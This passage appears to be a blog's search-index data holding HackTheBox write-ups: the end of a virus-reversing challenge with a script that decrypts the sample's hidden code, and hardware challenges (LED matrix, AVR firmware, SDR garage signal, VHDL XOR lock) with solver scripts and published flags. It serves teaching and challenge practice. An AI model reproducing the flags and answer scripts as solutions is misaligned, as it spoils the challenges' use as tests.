0x0AFD79C343528DEC, 0x0F7FEA94A59656C0, 0x8DAE5CB998000000, 0x1770879F9859C398, 0x28B283C42B81C398, 0x7B7B67D3051D07B1, 0xBFE4C34F82F76B75, 0x1B6CED770BFBA985, 0xB8E5061F67130000, 0x953D7B885F773041, 0x1C206CC310CA422A, 0x87130CC425BC4A04 ] KEY_1 = 0x6E2368B9C685770B KEY_2 = 0xEB7FD64E061C1A3D KEY_3 = 0xCB8FF2D53D7505A1 KEY_4 = 0xF1EF554206DCE4D def reverse_hex_string(h): result = \u0026#34;\u0026#34; for i in range(0, len(h), 2): result = h[i:i+2] + result return result def print_blob(c): result = \u0026#34;\u0026#34; for v in c: hex_string = f\u0026#34;{v:016X}\u0026#34; result += reverse_hex_string(hex_string) print(result, end=\u0026#34;\\n\\n\u0026#34;) def decrypt(key): for i in range(len(code)): code[i] = (code[i] * key) \u0026amp; 0xFFFFFFFFFFFFFFFF decrypt(KEY_1) decrypt(KEY_2) decrypt(KEY_3) decrypt(KEY_4) print_blob(code) Attempting to analyze this decrypted code didn\u0026rsquo;t yield any results, so I figured it required the context of the full program to work successfully. At this point I used HxD to patch the virus exe to overwrite the encrypted code with the decrypted one. Then I opened it in IDA and saw that the decrypted code was also resolving more functions dynamically, although these function\u0026rsquo;s aren\u0026rsquo;t too important as the flag is visible in plaintext at this point. The functions would open up a message box containing the flag value I think.\nLessons Learned I spent much more time on this challenge than I should have. A lot of time was wasted on reversing the exact infection process and seeing what fields were being changed in the headers of the victim file. I should have focused on the decryption portion and the code surrounding that instead. All in all, I think for next time I should focus less on the details and more so on the \u0026ldquo;bigger picture\u0026rdquo; of what the application is doing.\n","date":"2023-09-12T02:45:01-07:00","image":"https://Kvn11.github.io/p/htb-iterative-virus/img/hackthebox_hud104239935165a44571788a9c3d01fba_34890_120x120_fill_q75_box_smart1.jpg","permalink":"https://Kvn11.github.io/p/htb-iterative-virus/","title":"HTB Iterative Virus"},{"content":" Challenge Description: One of our embedded devices has been compromised. It was flashing a message on the debug matrix that was too fast to read, although we managed to capture one iteration of it. We must find out what was displayed. To help you with your mission, we will also provide you with the fabrication files of the PCB module the matrix was on.\nWalkthrough The zip files contains a Gerber module, as well as a .csv containing what seems to be the outputs of different GPIO pins, as well as the time they were recorded.\nHaving never really worked with a Gerber module before I had to do research to figure out its importance and usage.\nGerber describes the elements of a printed circuit board (PCB). It is used for both the fabrication of the board, and its assembly. A quick google search tells me that I can open the files using gerbv. For some reason, the window would go black whenever I tried importing the .DRL files, so I excluded those. However, this is the final result:\nThere is a term Common Anode Matrix that I have never heard of before, as well as the MCU on the board being a Raspberry Pi 3b+ Hat. ChatGPT reveals that a common anode matrix is simply a grid of LED\u0026rsquo;s, and specific LED\u0026rsquo;s are supplied voltage to create images, letters, or numbers. Based on this, I can assume that the flag is flashing on the matrix, and I need to map the outputs of the .csv file to its LED on the board. I was able to find the following image online which nicely displays the pinout of the Raspberry Pi:\n","date":"2023-05-10T02:45:01-07:00","image":"https://Kvn11.github.io/p/htb-hw-challenge-trace/img/hackthebox_hud104239935165a44571788a9c3d01fba_34890_120x120_fill_q75_box_smart1.jpg","permalink":"https://Kvn11.github.io/p/htb-hw-challenge-trace/","title":"HTB HW Challenge Trace"},{"content":" Challenge Description: Concerned about the integrity of devices produced at a remote fabrication plant, management has ordered a review of our production line. This revealed many things, including a weird embedded device in one of our serial networks. In attempting to remove it, we accidentally triggered a hardware failsafe, which resulted in the device stopping working. However, luckily we extracted the firmware prior to doing so. We need to find out what it did to the slave device it was tapped into, can you help us? The microcontroller of the device appears to be an atmega328p.\nWalkthrough We are given the file extracted_firmware.hex which contains the hex strings of the data. A quick google search tells us that we can use the avr-objdump to get the disassembly of this binary blob.\navr-objdump -s -m avr5 extracted_firmware.hex -D\nLooking at the disassembly, it seems that there are a lot of repeated instructions, but there are a few sections where the code is different.\nWe can analyze the repeated sections first to get an idea of what its repeatedly doing.\nThere seems to be two instructionst that repeated, cbi and sbi and they are working on the registers at 0x0A and 0x0B.\nLooking at the datasheet we can see that these are the DDRD and PORTD registers respectively.\nThe cbi instruction clears a bit in the register, and sbi sets the bit. Reading about the pin configuration reveals more information as well.\nThe DDxn bit in the DDRx register selects the direction of this pin. If DDxn is written logic one, Pxn is configured as an output pin. If DDxn is written logic zero, Pxn is configured as an input pin.\nThus based on this, we know that the instruction at address 0x86 is writing logic zero to DDD4, meaning that PIND4 is configured as an input pin. However, this isn\u0026rsquo;t as interesting as the data being written to the PORTD data register, which presumably holds the data to be sent as output. The instructions:\n1 2 3 54 98 cbi 0x0a, 4 ; 10 5f 9a sbi 0x0b, 7 ; 11 5f 98 cbi 0x0b, 7 ; 11 seems to clear the USART internal clock, then seems to toggle bit 7 of Port D, which can either be the analog comparator negative input, or the pin change interrupt source 23. I wrote a python script to visualize the changes in the register bits for the rest of the instructions, which helped me see that Port D6 was changing in a repeated pattern, while Port D5 was not changing in a discernable pattern.\nBit 6 seems to be alternating between 0 and 1 so I don\u0026rsquo;t think it would have anything interesting to show. Since bit 5 looks more random, I decided to try figure out what it creates. Since this is probably transmitting over UART or some type of serial interface, I figured I should start there for visualizing it.\nIn the end, this was my solution for pulling getting the flag. For the script to work, you need to isolate the big chunk of cbi and sbi instructions and ignore the others.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 #!/usr/bin/python3 def main(): bit_5 = [] bit_6 = [] lines = None with open(\u0026#34;disassembly.txt\u0026#34;) as f: lines = f.readlines() for instr in lines: op, reg, bit = process_instr(instr) if op == \u0026#34;cbi\u0026#34;: if bit == 5: bit_5.append(0) elif bit == 6: bit_6.append(0) elif op == \u0026#34;sbi\u0026#34;: if bit == 5: bit_5.append(1) elif bit == 6: bit_6.append(1) ctr = 0 b_string = \u0026#34;\u0026#34; characters = \u0026#34;\u0026#34; for b in bit_5: b_string += str(b) ctr += 1 if ctr == 8: characters += chr( int(b_string, 2) ) b_string = \u0026#34;\u0026#34; ctr = 0 print(characters) def process_instr(instr): values = instr.strip().split(\u0026#34;\\t\u0026#34;) op = values[0] operands = values[1].split(\u0026#34;, \u0026#34;) return (op, operands[0], int(operands[1])) def cbi_1(register, bit): register.append(0) def sbi_1(register, bit): register.append(1) main() The flag is: HTB{817_84n91n9_15_3v32ywh323!@#$%}\n","date":"2023-05-07T02:45:01-07:00","image":"https://Kvn11.github.io/p/bare-metal/img/hackthebox_hud104239935165a44571788a9c3d01fba_34890_120x120_fill_q75_box_smart1.jpg","permalink":"https://Kvn11.github.io/p/bare-metal/","title":"HTB HW Challenge: Bare Metal"},{"content":" Challenge Description: We have found the garage where some cyber criminals have all their stuff. Using an SDR device, we captured the signal from the remote key that opens the garage. Can you help us to analyze it?\nWalkthrough The challenge zip file contains signal.cf32 which can be opened with inspectrum.\nWe can increase the FFT size, power max, and power min settings to get a more clear view of the signals.\nThen we can right click on the bright signal segments and add an amplitude plot. We need to shrink our window to reduce noise.\nNow we right click on our amplitude plot, and select Add derived plot -\u0026gt; add threshold plot to get our plot of 1\u0026rsquo;s and 0\u0026rsquo;s. We also enable the cursors so we can start describing what will determine a 1 and what will determine a 0. Then we can increase the amount of cursors until we have covered the entire capture. Doesn\u0026rsquo;t need to be perfectly lined up.\nTo export the bits, we need to right click on the threshold plot, and then select extract symbols to stdout. I removed the whitespace and comma\u0026rsquo;s so that I could use it with an online machenster decoding tool. You can figure out this is manchester encoded due to the bit patterns. The bits are always going from high to low, or low to high, but never high to high or low to low. You can use dcode.fr/manchester-code to decode the bits into their final form.\nAfter we have the final decoded bits, we can use CyberChef to convert the bits to text.\n","date":"2023-05-04T02:45:01-07:00","image":"https://Kvn11.github.io/p/htb-hw-challenge-rflag/img/hackthebox_hud104239935165a44571788a9c3d01fba_34890_120x120_fill_q75_box_smart1.jpg","permalink":"https://Kvn11.github.io/p/htb-hw-challenge-rflag/","title":"HTB HW Challenge RFlag"},{"content":" Challenge Description: We found ourselves locked in an escape room, with the clock ticking down and only one puzzle to solve. The final challenge involves opening the door, and the clue provided to use by the game master is that the key for the encrypted password is a 4-byte sequence.\nWalkthrough The challenge download gives us two files lock.vhd and out.txt. The second file is presumably the output of the first, and contains two columns of values. At first glance the first file appears to be a Virtual Hard Disk, but based on the name of the challenge and a quick search of the import use ieee.std_logic_1164.all, it can be determined that this is a VHDL file. If you want to learn more about VHDL files, and how to write/read them, I recommend this playlist: Your first VHDL Program.\nThe first part of this file is creating an xor_get function that takes 2 inputs, each 2 bytes wide, XOR\u0026rsquo;s them, and outputs the 2 byte result to output.\nThe second component takes in a 4 but value and maps it to a 16 bit value. This value is given to output.\nThe last component of the file is where the process of generating out.txt can be explained.\nThe main entity describes the inputs we can expect. 2 4-bit values, along with a 2 byte XOR key, and it will have 2 2-byte outputs, seen in out.txt. Our 2 4-bit values are translated into a 16-bit value, and then those values are XOR\u0026rsquo;d against the unknown key. However, given that HackTheBox flags always have the format HTB{...} we can assume to know the first 4 inputs. Since we now know the 2 of the 3 values used in the XOR operation used to generate the outputs, we can derive the 4 byte key using the following process:\n1 2 3 4 output_1 ^ decoder_4x16(\u0026#34;H\u0026#34;) = 1st byte of key. output_2 ^ decoder_4x16(\u0026#34;T\u0026#34;) = 2nd byte of key. output_3 ^ decoder_4x16(\u0026#34;B\u0026#34;) = 3rd byte of key. output_4 ^ decoder_4x16(\u0026#34;{\u0026#34;) = 4th byte of key. Here is the code to generate the key:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 #!/usr/bin/python3 def decoder_4x16(signal): cases = dict() val = 1 for n in range(16): cases[n] = val val = val \u0026lt;\u0026lt; 1 if (signal \u0026lt; 0) or (signal \u0026gt; 15): return 0 else: return cases[signal] def get_key(): inputs = [] outputs = [35, 307, 17, 33, 33, 53, 183, 2103] key = [] for c in \u0026#34;HTB{\u0026#34;: inputs.append( (ord(c) \u0026amp; 0xf0) \u0026gt;\u0026gt; 4 ) inputs.append( ord(c) \u0026amp; 0x0f ) for i in range(len(inputs)): key.append( decoder_4x16(inputs[i]) ^ outputs[i] ) for k in key: print(f\u0026#34;0x{k:02X}\u0026#34;) get_key() It will output the values:\n1 2 3 4 5 6 7 8 0x33 0x33 0x31 0x31 0x31 0x31 0x37 0x37 From this we know the key to be 0x33313137. Now the rest of the challenge is just to reverse the outputs so we can figure out the inputs. Here is the code to solve the challenge:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 #!/usr/bin/python3 def encoder_4x16(signal): cases = dict() val = 1 for n in range(16): cases[val] = n val = val \u0026lt;\u0026lt; 1 return cases[signal] def reverse_process(): key = [ 0x33, 0x31, 0x31, 0x37 ] lines = None outputs = [] flag = \u0026#34;\u0026#34; with open(\u0026#34;out.txt\u0026#34;) as f: lines = f.readlines() for line in lines: outputs.append([int(x) for x in line.strip().split(\u0026#34; \u0026#34;)]) for i in range( len(outputs) ): d1 = encoder_4x16( outputs[i][0] ^ (key[i % 4] )) d2 = encoder_4x16( outputs[i][1] ^ (key[i % 4] )) c = (d1 \u0026lt;\u0026lt; 4) | d2 flag += chr(c) print(flag) reverse_process() The flag is: HTB{I_L0v3_VHDL_but_LOve_my_5w33thear7_m0re}.\n","date":"2023-05-03T02:45:01-07:00","image":"https://Kvn11.github.io/p/htb-hw-challenge-vhdlock/img/hackthebox_hud104239935165a44571788a9c3d01fba_34890_120x120_fill_q75_box_smart1.jpg","permalink":"https://Kvn11.github.io/p/htb-hw-challenge-vhdlock/","title":"HTB HW Challenge VHDLock"}]